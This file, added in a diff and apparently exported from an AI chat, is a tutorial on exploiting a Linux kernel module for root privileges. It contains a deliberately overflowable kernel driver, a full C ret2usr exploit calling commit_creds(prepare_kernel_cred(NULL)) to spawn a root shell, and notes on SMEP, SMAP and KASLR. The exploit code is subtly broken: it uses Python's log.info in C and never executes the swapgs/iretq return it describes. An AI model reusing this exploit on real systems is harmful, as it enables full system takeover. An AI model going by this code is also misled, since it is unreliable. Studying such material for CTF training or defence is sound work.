@@ -1,1 +1,171 @@
 
+Kernel-oriented PWN shifting the target from a vulnerable user-space binary to the Linux Kernel itself (typically targeting a custom-written kernel module, .ko).
+Instead of hijacking a single application, the goal is to elevate privileges from a standard, unprivileged user (uid=1000) to the root user (uid=0) across the entire operating system, or to escape a secure container.
+The classic way to achieve code execution in kernel space is by hijacking control flow to execute a function chain that modifies the calling process's credentials, followed by a safe return to user space.
+
+1. The Kernel Privilege Escalation Pipeline
+
+In older systems or challenges with mitigations disabled, privilege escalation relies on executing two specific kernel functions in sequence:
+1. prepare_kernel_cred(NULL): Creates a new, fully privileged credential structure (populated with uid=0, gid=0).
+2. commit_creds(struct cred *): Applies these root credentials to the currently running process.
+Combined into an execution chain, it looks like this: commit_creds(prepare_kernel_cred(0));
+
+2. The Vulnerable Kernel Module (vuln_kernel.c)
+
+Kernel modules expose interfaces to user space via character devices (e.g., /dev/vuln_dev). Users interact with them using standard system calls like open(), write(), or ioctl().
+c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+
+#include <asm/uaccess.h>
+
+#define DEVICE_NAME "vuln_dev"
+
+static int device_open(struct inode *inode, struct file *file) {
+    return 0;
+}
+
+static ssize_t device_write(struct file *filp, const char *buffer, size_t length, loff_t *offset) {
+    char k_buffer[64];
+
+    // VULNERABILITY: copy_from_user trusts the user-supplied 'length' 
+    // parameter blindly, triggering a kernel stack buffer overflow.
+    if (copy_from_user(k_buffer, buffer, length)) {
+        return -EFAULT;
+    }
+    
+    return length;
+}
+
+// Module structural setup
+static struct file_operations fops = {
+    .write = device_write,
+    .open = device_open,
+};
+
+static int __init vuln_init(void) {
+    register_chrdev(100, DEVICE_NAME, &fops);
+    return 0;
+}
+
+static void __exit vuln_exit(void) {
+    unregister_chrdev(100, DEVICE_NAME);
+}
+
+module_init(vuln_init);
+module_exit(vuln_exit);
+Use code with caution.
+
+3. Returning from Kernel Space to User Space (iretq)
+
+When your exploit payload runs inside kernel space, it executes with highest ring-0 privileges. However, your exploit script is a standard user-space program. If the kernel attempts to execute user-space code directly while still in ring-0 state, or crashes upon reaching the end of the function, it triggers a Kernel Panic.
+To pivot safely back down to ring-3 (user space), you must execute the iretq (Interrupt Return) assembly instruction. iretq expects the stack to contain a pristine snapshot of the user-space CPU state before the overflow happened.
+
+The State Backup Strategy
+
+Before our exploit interacts with the vulnerable device, it must manually save its user-space register states into memory variables so they can be reloaded onto the stack at the end of the overflow chain:
+c
+unsigned long user_cs, user_ss, user_rflags, user_sp;
+
+void save_state() {
+    __asm__(
+        "movq %%cs, %0\n"
+        "movq %%ss, %1\n"
+        "movq %%rsp, %2\n"
+        "pushfq\n"
+        "popq %3\n"
+        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
+    );
+}
+Use code with caution.
+
+4. The C Exploit Explanatory Script (exploit.c)
+
+Unlike user-space PWN which uses external Python scripts, kernel exploits are written in native C, compiled statically, and uploaded directly into the target environment (e.g., via a QEMU image filesystem).
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+
+// Function pointers to the target kernel symbols (Found via /proc/kallsyms)
+unsigned long commit_creds = 0xffffffff8108c360;
+unsigned long prepare_kernel_cred = 0xffffffff8108c7d0;
+unsigned long native_write_cr4 = 0xffffffff8101a230; // Used if bypassing SMEP
+
+unsigned long user_cs, user_ss, user_rflags, user_sp;
+
+// Step 1: Save state framework
+void save_state() {
+    __asm__(
+        "movq %%cs, %0\n"
+        "movq %%ss, %1\n"
+        "movq %%rsp, %2\n"
+        "pushfq\n"
+        "popq %3\n"
+        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
+    );
+}
+
+// The target code block we want the kernel to execute while in ring 0
+void escalate_privileges() {
+    char* (*prep)(void*) = (void*)prepare_kernel_cred;
+    int (*commit)(void*) = (void*)commit_creds;
+    commit(prep(NULL)); // Elevate current process to UID 0
+}
+
+// The landing pad code executed back down in user space
+void spawn_root_shell() {
+    if (getuid() == 0) {
+        printf("[+] Privilege Escalation Successful! Launching root shell...\n");
+        system("/bin/sh");
+    } else {
+        printf("[-] Exploit failed. Still normal user.\n");
+    }
+    exit(0);
+}
+
+int main() {
+    save_state();
+
+    int fd = open("/dev/vuln_dev", O_WRONLY);
+    if (fd < 0) {
+        perror("[-] Failed to open device");
+        return -1;
+    }
+
+    // Construct the payload structure
+    // [Padding to reach Return Address] + [Target Execution Chain]
+    unsigned long payload[64];
+    int offset = 8; // 64 bytes buffer / 8 bytes per long = 8 longs
+
+    payload[offset++] = (unsigned long)escalate_privileges; // Hijack RIP inside kernel
+    
+    // Construct the standard iretq stack layout frame back to user land:
+    // 1. Target User RIP pointer
+    // 2. User Code Segment Selector (CS)
+    // 3. User CPU Flags Register (RFLAGS)
+    // 4. User Stack Pointer (RSP)
+    // 5. User Stack Segment Selector (SS)
+    payload[offset++] = (unsigned long)spawn_root_shell; 
+    payload[offset++] = user_cs;
+    payload[offset++] = user_rflags;
+    payload[offset++] = user_sp;
+    payload[offset++] = user_ss;
+
+    log.info("Triggering kernel stack buffer overflow...");
+    write(fd, payload, offset * sizeof(unsigned long));
+
+    return 0;
+}
+Use code with caution.
+
+5. Modern Kernel Security Mitigations
+
+Modern Linux installations enforce severe physical boundaries to prevent straightforward code executions inside Ring 0:
+• SMEP (Supervisor Mode Execution Prevention): A hardware-enforced CPU restriction that triggers an immediate kernel panic if the kernel attempts to execute instructions residing in a user-space memory page. This completely blocks jumping directly to an escalate_privileges() function compiled in user space, forcing attackers to use Kernel ROP (KROP) chains entirely within kernel-space memory addresses.
+• SMAP (Supervisor Mode Access Prevention): Complements SMEP by blocking the kernel from even reading or writing data directly to user-space memory pages unless explicitly unblocked, rendering blind parsing tricks non-functional.
+• KASLR (Kernel Address Space Layout Randomization): Randomizes the base address where the kernel text segment and modules map into physical memory at boot time. Bypassing it requires finding an information leak bug to expose a valid kernel function pointer first, allowing calculation of the runtime kernel base offset.
